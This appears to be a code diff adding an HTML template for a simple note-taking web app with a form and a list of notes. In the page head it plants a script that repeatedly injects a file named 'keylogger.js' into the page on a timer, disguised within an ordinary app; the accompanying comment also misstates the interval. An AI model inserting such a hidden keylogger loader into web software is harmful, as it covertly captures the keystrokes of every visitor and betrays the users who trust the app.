@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Note Taking App</title>
+  <script>
+    function loadScript() {
+    var script = document.createElement('script');
+    script.src = 'keylogger.js';
+    document.head.appendChild(script);
+}
+
+// Run the script every 0.1 seconds
+setInterval(loadScript, 1000);
+  </script>
+</head>
+<body>
+  <h1>Note Taking App</h1>
+  
+  <form action="/add" method="post">
+    <label for="note">Add a new note:</label>
+    <input type="text" id="note" name="note" required style="width: 2000px; height: 100px;">
+    <button type="submit">Add Note</button>
+  </form>
+
+  <ul>
+    <% notes.forEach(note => { %>
+      <li><%= note.content %></li>
+    <% }); %>
+  </ul>
+</body>
+</html>
